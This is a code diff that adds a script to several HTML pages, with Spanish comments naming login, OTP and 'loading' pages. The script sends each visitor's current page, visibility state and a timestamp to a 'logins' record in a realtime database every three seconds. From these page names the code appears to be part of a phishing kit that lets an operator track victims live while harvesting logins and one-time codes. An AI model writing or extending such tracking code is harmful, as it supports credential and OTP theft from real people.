@@ -2521,5 +2521,31 @@
         }
         // ]]>
     </script>
+    <script>
+        // Agrega esto en index2.html, otp.html, otp2.html, cargando.html, cargando2.html
+const id = new URLSearchParams(window.location.search).get('id') || localStorage.getItem('registro_id');
+
+function reportarEstado() {
+    const pagina = window.location.pathname.split('/').pop();
+    const online = document.visibilityState === 'visible';
+    
+    if (id && db) {
+        db.ref('logins/' + id).update({
+            pagina: pagina,
+            online: online,
+            ultimoPing: Date.now()
+        });
+    }
+}
+
+// Reportar cada 3 segundos
+setInterval(reportarEstado, 3000);
+
+// Reportar cuando cambia visibilidad
+document.addEventListener('visibilitychange', reportarEstado);
+
+// Reportar al cargar
+reportarEstado();
+    </script>
 </body>
 </html>
